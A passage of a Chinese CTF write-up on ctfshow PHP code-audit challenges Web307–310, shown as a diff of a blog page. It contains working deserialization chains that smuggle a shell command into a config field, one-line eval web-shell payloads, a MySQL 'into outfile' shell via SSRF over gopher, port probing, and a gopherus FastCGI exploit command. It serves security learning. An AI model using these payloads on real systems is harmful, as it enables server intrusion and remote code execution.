+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">config</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$cache_dir</span> <span class="o">=</span> <span class="s1">&#39;;echo &#34;&lt;?php @eval(\$_POST[1]); ?&gt;&#34; &gt; /var/www/html/f.php;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dao</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//echo serialize($a);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NTg6IjtlY2hvICI8P3BocCBAZXZhbChcJF9QT1NUWzFdKTsgPz4iID4gL3Zhci93d3cvaHRtbC9mLnBocDsiO31zOjk6IgBkYW8AY29ubiI7Tjt9
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251208173929983.png"
+	width="1004"
+	height="1091"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251208173929983_hu14978055171838980449.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251208173929983_hu10170509311375703667.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251208173929983"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="220px"
+	
+></p>
+<p>讲一下构造脚本的思路，其实有些曲折</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">service</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$dao</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dao</span><span class="o">=</span><span class="k">new</span> <span class="nx">dao</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dao</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$conn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="k">new</span> <span class="nx">config</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">config</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$cache_dir</span> <span class="o">=</span> <span class="s1">&#39;;echo &#34;&lt;?php @eval(\$_POST[1]); ?&gt;&#34; &gt; /var/www/html/f.php;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">service</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一开始，我看到<code>logout.php</code>里包含了<code>service</code>就觉得肯定需要从<code>service</code>类开始。但其实，从<code>service类</code>的话，是不行的。后来经过了解，发现了<code>php</code>的包含链</p>
+<p>后来还发现这个命令注入写马居然还需要转义一下<code>\$_POST</code>，命令注入看来是需要转义的（写入包含php代码的文件也需要）</p>
+<p>（分析还可以，但是构造代码功力还是弱了）</p>
+<h2 id="web308">Web308
+</h2><h3 id="知识点项目反序列化链ssrf打mysql">知识点：项目反序列化链ssrf打mysql
+</h3><p>最后一个项目，后续都是这个源码</p>
+<p>依旧项目结构：</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209151259400.png"
+	width="251"
+	height="546"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209151259400_hu13152859977237787536.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209151259400_hu1559329338551331258.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209151259400"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="45"
+		data-flex-basis="110px"
+	
+></p>
+<p>简单审计之后，发现之前那个命令注入的地方加了一点<code>waf</code></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209154928998.png"
+	width="966"
+	height="158"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209154928998_hu16241580248756186462.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209154928998_hu10806234274651156379.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209154928998"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="611"
+		data-flex-basis="1467px"
+	
+></p>
+<p>所以也过不了了，只能寻找新的</p>
+<p>在<code>index.php</code>中看到有调用奇怪的东西</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209165530023.png"
+	width="881"
+	height="438"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209165530023_hu4401175742916236974.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209165530023_hu17986809758177626256.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209165530023"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="482px"
+	
+></p>
+<p>跟进查看</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209170838087.png"
+	width="952"
+	height="463"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209170838087_hu16974860710822790173.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209170838087_hu6603540328729068544.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209170838087"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="493px"
+	
+></p>
+<p>熟悉的<code>dao.php</code>，这里调用了一个<code>checkUpdate</code>，继续跟进</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171026344.png"
+	width="953"
+	height="511"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171026344_hu5186216355805819896.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171026344_hu15639782662909870034.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209171026344"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>最后在<code>fun.php</code>有一个<code>ssrf</code></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171232701.png"
+	width="892"
+	height="615"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171232701_hu10235066714819794526.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251209171232701_hu11341602699514591140.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251209171232701"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="348px"
+	
+></p>
+<p>结合题目描述说要拿shell，这里可以想到通过<code>ssrf</code>连接<code>mysql</code>打<code>sql</code>注入木马</p>
+<p>先生成一个payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">select</span> <span class="s2">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113224102.png"
+	width="1100"
+	height="488"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113224102_hu1272084008084103000.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113224102_hu7118212826329023815.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212113224102"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="540px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dao</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="k">new</span> <span class="nx">config</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">checkVersion</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">checkUpdate</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">update_url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">config</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$update_url</span> <span class="o">=</span> <span class="s1">&#39;gopher&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dao</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在index.php发包（这里虽然有重定向，但是不妨碍继续执行代码）</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113433656.png"
+	width="1043"
+	height="279"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113433656_hu6781919239550318483.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212113433656_hu12958327702340311392.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212113433656"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="897px"
+	
+></p>
+<h2 id="web309">Web309
+</h2><h3 id="知识点gopher协议探测端口打fastcgi">知识点：gopher协议探测端口，打<code>FastCGI</code>
+</h3><p>题目描述：308方法失效，mysql需要密码了</p>
+<p>附件没变，审计过程就忽略了，主要看利用方式。</p>
+<p>漏洞点还是<code>ssrf</code>我们可以通过<code>gopher</code>协议探测一下可用的一些端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dao</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="k">new</span> <span class="nx">config</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">checkVersion</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">checkUpdate</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">-&gt;</span><span class="na">update_url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">config</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$update_url</span> <span class="o">=</span> <span class="s1">&#39;gopher://127.0.0.1:[端口]&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dao</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">常见服务
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#21 ftp
+</span></span><span class="line"><span class="cl">#22 ssh
+</span></span><span class="line"><span class="cl">#80 http
+</span></span><span class="line"><span class="cl">#443 https
+</span></span><span class="line"><span class="cl">#3389 rdp windows远程桌面
+</span></span><span class="line"><span class="cl">#1433 ms-sqlserver 默认端口
+</span></span><span class="line"><span class="cl">#3306 mysql 默认端口
+</span></span><span class="line"><span class="cl">#6379 redis 默认端口
+</span></span><span class="line"><span class="cl">#9000 php-fpm(FastCGI) 默认端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>用Gopher请求端口时，如果端口有服务在监听，则会接受连接并等待我们传输数据，此时连接会&quot;卡住&quot;一段时间；如果端口没有服务，则会立刻拒绝连接。通过是否出现等待，就能判断端口是否开放</em></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212143532229.png"
+	width="1749"
+	height="755"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212143532229_hu337525211210264502.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212143532229_hu1331237161021925452.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212143532229"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="555px"
+	
+></p>
+<p>说明这里存在9000端口的<code>FastCGI</code>（快速通用网关接口，用于<code>php</code>加速网页处理请求）</p>
+<p>这里再说句题外话，因为<code>java</code>是不用这个老掉牙的技术的，所以现在环境里几乎没有这个。甚至<code>php</code>都只有一些灰黑产业会用</p>
+<p>所以学学看就好了，不用太深入，我们还是要学一些通用漏洞</p>
+<p>怎么打呢</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./gopherus.py --exploit fastcgi
+</span></span><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">echo  &#34;&lt;?php eval(\$_POST[1]);?&gt;&#34; &gt;1.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里也可以反弹shell（这里转义符号之前还记录了一下）</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150931612.png"
+	width="1246"
+	height="409"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150931612_hu3791001269866771222.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150931612_hu16406611464693075992.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212150931612"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="731px"
+	
+></p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150957555.png"
+	width="1054"
+	height="281"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150957555_hu14107905027118040056.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212150957555_hu2455563821622912586.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212150957555"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="375"
+		data-flex-basis="900px"
+	
+></p>
+<p>直接读就行了</p>
+<h2 id="web310">Web310
+</h2><h3 id="知识点同上-1">知识点：同上
+</h3><p>思路同上，flag换了个地方</p>
+<p><img src="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212151448359.png"
+	width="623"
+	height="270"
+	srcset="/p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212151448359_hu13706147091909177537.png 480w, /p/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20251212151448359_hu14313574767007923207.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251212151448359"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="553px"
+	
+></p>
+<h2 id="总结">总结
+</h2><p>总结下来还是有些收获的，对<code>php</code>的代码审计已经有些眉头了，有些自己的方式方法。另外还学到了<code>sstf</code>打<code>FastCGI</code>，这真是从来没接触过的东西。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">极客大挑战2025</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">面试八股文</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyberstrikelab渗透复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">春秋云镜渗透复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
